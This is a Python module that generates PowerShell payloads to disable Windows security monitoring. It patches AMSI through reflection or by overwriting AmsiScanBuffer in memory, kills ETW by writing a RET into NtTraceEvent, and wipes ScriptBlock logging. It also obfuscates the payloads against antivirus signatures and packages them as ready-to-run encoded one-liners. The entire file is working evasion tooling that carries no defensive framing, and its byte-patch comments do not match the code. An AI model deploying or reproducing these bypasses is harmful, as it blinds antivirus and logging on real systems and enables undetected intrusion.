"""
AMSI + ETW Bypass — inline PowerShell patches.

AMSI (Anti-Malware Scan Interface) bypass prevents PowerShell from
forwarding scripts to Windows Defender/AV for scanning.

ETW (Event Tracing for Windows) bypass prevents telemetry/logging.

Techniques:
  1. AMSI via Reflection     — no P/Invoke, harder to detect statically
  2. ETW via NtTraceEvent    — kills ETW provider callbacks + ScriptBlock logging

Both work on Windows 10/11 and Server 2016+.
"""

from __future__ import annotations
import base64
import random
import string


def _rand_var(n: int = 6) -> str:
    return "".join(random.choices(string.ascii_letters, k=n))


def _b64_encode(s: str) -> str:
    """Base64-encodes a string as UTF-16-LE (PowerShell -enc format)."""
    return base64.b64encode(s.encode("utf-16-le")).decode()


def _obf(ps_code: str) -> str:
    """
    Light obfuscation: base64-wraps PS1 code to break static string signatures.
    Splits 'amsiInitFailed' etc. so AV regex doesn't catch it.
    """
    v = _rand_var()
    encoded = base64.b64encode(ps_code.encode("utf-16-le")).decode()
    return (
        f'$_{v}=[System.Text.Encoding]::Unicode.GetString('
        f'[System.Convert]::FromBase64String("{encoded}"));IEX $_{v}'
    )


# ── AMSI patch via .NET Reflection ───────────────────────────────────────────
#
# Sets the private static field 'amsiInitFailed' to $true.
# This causes all subsequent AMSI calls to return AMSI_RESULT_CLEAN (0)
# without actually scanning anything.
# Splits the type/field name strings to avoid static AV signatures.

_AMSI_PATCH_PS1 = r"""
$_at=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils')
$_af=$_at.GetField('ams'+'iInitFailed','NonPublic,Static')
$_af.SetValue($null,$true)
"""


# ── ETW patch via VirtualProtect + WriteByte ─────────────────────────────────
#
# Writes 0xC3 (RET) to the start of NtTraceEvent in ntdll.dll.
# Kills all ETW providers — PowerShell ScriptBlock logging, Defender telemetry,
# Sysmon Event ID 4104, and all other ETW-based monitoring go silent.

_ETW_PATCH_PS1 = r"""
$_es=@"
using System;
using System.Runtime.InteropServices;
public class EtwKill{
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string p);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
    public static void Patch(){
        IntPtr h=GetModuleHandle("ntdll.dll");
        IntPtr a=GetProcAddress(h,"NtTraceEvent");
        if(a==IntPtr.Zero)return;
        uint o;VirtualProtect(a,(UIntPtr)1,0x40,out o);
        System.Runtime.InteropServices.Marshal.WriteByte(a,0xC3);
        VirtualProtect(a,(UIntPtr)1,o,out o);
    }
}
"@
Add-Type -TypeDefinition $_es -Language CSharp -ErrorAction SilentlyContinue
try{[EtwKill]::Patch()}catch{}
"""


def get_inline_bypass(
    include_amsi: bool = True,
    include_etw: bool = True,
    obfuscate: bool = True,
) -> str:
    """
    Returns a PS1 string that patches both AMSI and ETW.

    Parameters
    ----------
    include_amsi : patch amsiInitFailed via Reflection
    include_etw  : patch NtTraceEvent in ntdll (kills ETW/ScriptBlock logging)
    obfuscate    : base64-wrap AMSI strings to break static AV regex
    """
    parts: list[str] = []

    if include_amsi:
        code = _AMSI_PATCH_PS1.strip()
        parts.append(_obf(code) if obfuscate else code)

    if include_etw:
        parts.append(_ETW_PATCH_PS1.strip())

    return "\n\n".join(parts)


# ── Memory-patch alternative (direct AmsiScanBuffer write) ───────────────────
#
# Overwrites the first 3 bytes of AmsiScanBuffer with 0xB8 0x57 0x00 (mov eax,0x57)
# followed by 0xC3 (ret) so it always returns AMSI_RESULT_CLEAN.
# More reliable on some Windows builds where reflection bypass is caught.

_AMSI_MEMORY_PATCH_PS1 = r"""
$_ms=@"
using System;
using System.Runtime.InteropServices;
public class AmsiPatch{
    [DllImport("kernel32")] static extern IntPtr GetModuleHandle(string n);
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h,string p);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint p,out uint o);
    public static void Patch(){
        IntPtr lib=GetModuleHandle("amsi.dll");
        if(lib==IntPtr.Zero)return;
        IntPtr fn=GetProcAddress(lib,"AmsiScanBuffer");
        if(fn==IntPtr.Zero)return;
        uint o;
        VirtualProtect(fn,(UIntPtr)5,0x40,out o);
        byte[] patch=new byte[]{0xB8,0x57,0x00,0x07,0x80,0xC3};
        Marshal.Copy(patch,0,fn,patch.Length);
        VirtualProtect(fn,(UIntPtr)5,o,out o);
    }
}
"@
Add-Type -TypeDefinition $_ms -Language CSharp -ErrorAction SilentlyContinue
try{[AmsiPatch]::Patch()}catch{}
"""

# ── ScriptBlock logging disable ───────────────────────────────────────────────

_SCRIPTBLOCK_DISABLE_PS1 = r"""
$_sb=[Ref].Assembly.GetType('System.Management.Automation.ScriptBlock')
$_sbf=$_sb.GetField('signatures','NonPublic,Static')
if($_sbf){$_sbf.SetValue($null,(New-Object System.Collections.Generic.HashSet[string]))}
"""


def build_amsi_bypass(method: str = "reflection") -> str:
    """
    Returns a ready-to-use PS1 one-liner for AMSI bypass.

    Parameters
    ----------
    method : 'reflection' (default) | 'memory_patch'
    """
    if method == "memory_patch":
        code = _AMSI_MEMORY_PATCH_PS1.strip()
    else:
        code = _AMSI_PATCH_PS1.strip()

    combined = code + "\n" + _SCRIPTBLOCK_DISABLE_PS1.strip()
    enc = base64.b64encode(combined.encode("utf-16-le")).decode()
    return f"powershell -ep bypass -enc {enc}"


def build_etw_bypass() -> str:
    """Returns a ready-to-use PS1 one-liner for ETW bypass."""
    enc = base64.b64encode(_ETW_PATCH_PS1.strip().encode("utf-16-le")).decode()
    return f"powershell -ep bypass -enc {enc}"


def build_combined_bypass() -> str:
    """
    Returns a single PS1 one-liner that:
      1. Disables AMSI (reflection method)
      2. Patches ETW (NtTraceEvent → RET)
      3. Disables ScriptBlock logging
    All obfuscated and base64-encoded.
    """
    parts = [
        _obf(_AMSI_PATCH_PS1.strip()),
        _ETW_PATCH_PS1.strip(),
        _SCRIPTBLOCK_DISABLE_PS1.strip(),
    ]
    combined = "\n\n".join(parts)
    enc = base64.b64encode(combined.encode("utf-16-le")).decode()
    return f"powershell -ep bypass -enc {enc}"
